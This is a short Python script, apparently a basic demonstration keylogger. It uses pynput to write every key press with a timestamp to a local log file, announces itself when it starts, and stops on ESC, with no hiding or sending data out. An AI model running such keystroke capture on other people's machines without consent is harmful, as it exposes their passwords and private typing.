from pynput import keyboard
import datetime
import os

log_file_path = "keylogger/log.txt"
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

def format_key(key):
    """Cleans up key representation"""
    if hasattr(key, 'char'):
        return key.char if key.char is not None else str(key)
    else:
        return str(key).replace('Key.', '')

def on_press(key):
    """Logs each key press with a timestamp"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_name = format_key(key)
    log_entry = f"{timestamp} - {key_name}\n"

    with open(log_file_path, "a") as log_file:
        log_file.write(log_entry)

    if key == keyboard.Key.esc:
        print("[*] ESC pressed. Exiting keylogger.")
        return False  # This stops the listener

if __name__ == "__main__":
    print("[*] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
